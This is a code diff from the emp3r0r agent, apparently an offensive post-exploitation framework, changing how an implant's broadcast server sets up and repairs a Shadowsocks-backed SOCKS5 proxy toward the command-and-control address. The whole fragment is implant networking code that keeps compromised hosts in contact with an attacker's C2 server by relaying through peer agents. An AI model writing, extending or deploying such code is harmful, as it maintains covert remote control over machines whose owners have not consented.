@@ -13,6 +13,7 @@ import (
 	"sync"
 	"time"
 
+	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/c2transport"
 	"github.com/jm33-m0/emp3r0r/core/internal/agent/base/common"
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/internal/transport"
@@ -176,19 +177,30 @@ func BroadcastServer(ctx context.Context, cancel context.CancelFunc, port string
 		}
 
 		// Reconstruct SOCKS5 URL
-		proxy_url := fmt.Sprintf("socks5://%s:%s@%s:%s",
-			common.RuntimeConfig.ShadowsocksLocalSocksPort,
-			common.RuntimeConfig.Password,
-			srcIP,
-			common.RuntimeConfig.AgentSocksServerPort)
+		// We use Shadowsocks to secure the connection
+		proxy_url := fmt.Sprintf("socks5://127.0.0.1:%s", common.RuntimeConfig.ShadowsocksLocalSocksPort)
 
 		// Check deduplication
 		if common.RuntimeConfig.C2TransportProxy == proxy_url {
-			continue
+			if transport.IsProxyOK(proxy_url, def.CCAddress) {
+				log.Printf("BroadcastServer: proxy %s already set and working fine\n", common.RuntimeConfig.C2TransportProxy)
+				continue
+			}
 		}
 
 		// test proxy
 		is_proxy_ok := transport.IsProxyOK(proxy_url, def.CCAddress)
+
+		// if the proxy is not working
+		// restart Shadowsocks local socks5 proxy
+		if !is_proxy_ok {
+			go c2transport.ShadowsocksLocalSocks(srcIP, common.RuntimeConfig.ShadowsocksLocalSocksPort)
+			// give it some time to start
+			time.Sleep(200 * time.Millisecond)
+		}
+
+		// test proxy again
+		is_proxy_ok = transport.IsProxyOK(proxy_url, def.CCAddress)
 
 		if is_proxy_ok {
 			common.RuntimeConfig.C2TransportProxy = proxy_url
